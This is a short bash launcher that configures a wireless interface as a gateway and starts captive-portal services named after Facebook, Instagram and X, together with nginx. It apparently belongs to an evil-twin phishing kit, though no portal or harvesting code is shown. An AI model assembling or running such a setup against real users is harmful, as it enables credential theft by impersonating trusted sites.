#!/bin/bash
# Wrapper start script to run captive servers and existing nginx/scripts/start.sh
# This script does not modify other scripts; it only orchestrates startup.

set -euo pipefail

ROOT_DIR="$(cd "$(dirname "$0")" && pwd)"
CAPTIVE_DIR="$ROOT_DIR/nginx/captive"
NGINX_SCRIPT="$ROOT_DIR/nginx/scripts/start.sh"
HOSTAPD_CONF="$ROOT_DIR/nginx/configs/hostapd.conf"

# Default gateway used by the existing scripts
GATEWAY="192.168.4.1"

echo "[*] Wrapper start: preparing environment..."

# Detect interface from hostapd.conf (first 'interface=' line)
if [ -f "$HOSTAPD_CONF" ]; then
  IFACE=$(grep -E '^interface=' "$HOSTAPD_CONF" | head -n1 | cut -d'=' -f2 | tr -d '\r\n') || true
fi

IFACE=${IFACE:-"wlx00c0cab84be3"}

echo "[*] Using interface: $IFACE"

echo "[*] Bringing interface up and assigning IP $GATEWAY/24"
sudo ip link set "$IFACE" down || true
sudo ip addr flush dev "$IFACE" || true
sudo ip addr add ${GATEWAY}/24 dev "$IFACE"
sudo ip link set "$IFACE" up

echo "[*] Starting captive Node services (facebook/instagram/x/default)"
if [ -f "$CAPTIVE_DIR/start-server.sh" ]; then
  (cd "$CAPTIVE_DIR" && bash start-server.sh)
else
  echo "[!] start-server.sh not found in $CAPTIVE_DIR"
fi

echo "[*] Running main nginx start script"
if [ -f "$NGINX_SCRIPT" ]; then
  sudo bash "$NGINX_SCRIPT"
else
  echo "[!] nginx/scripts/start.sh not found"
  exit 1
fi

echo "[*] All done. Check logs if something failed."
